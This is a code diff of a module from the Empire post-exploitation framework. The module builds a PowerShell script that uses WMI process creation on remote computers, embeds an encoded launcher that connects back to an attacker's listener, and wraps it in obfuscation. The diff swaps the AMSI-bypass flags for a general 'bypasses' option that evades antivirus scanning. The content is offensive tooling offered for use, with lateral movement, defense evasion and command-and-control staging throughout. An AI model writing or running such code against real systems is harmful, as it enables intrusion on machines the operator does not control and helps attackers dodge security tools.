@@ -2,6 +2,8 @@ from __future__ import print_function
 
 from builtins import str
 from builtins import object
+
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
 
@@ -15,8 +17,6 @@ class Module(object):
         script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
         # Set booleans to false by default
         obfuscate = False
-        amsi_bypass = False
-        amsi_bypass2 = False
 
         # management options
         cleanup = params['Cleanup']
@@ -28,10 +28,6 @@ class Module(object):
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
-        if (params['AMSIBypass']).lower() == 'true':
-            amsi_bypass = True
-        if (params['AMSIBypass2']).lower() == 'true':
-            amsi_bypass2 = True
 
         # storage options
         reg_path = params['RegPath']
@@ -71,7 +67,9 @@ class Module(object):
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscate_command,AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
+                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
+                                                               bypasses=params['Bypasses'])
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -114,10 +112,10 @@ class Module(object):
 
         script += ";'Invoke-Wmi executed on " +computer_names + status_msg+"'"
 
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
 
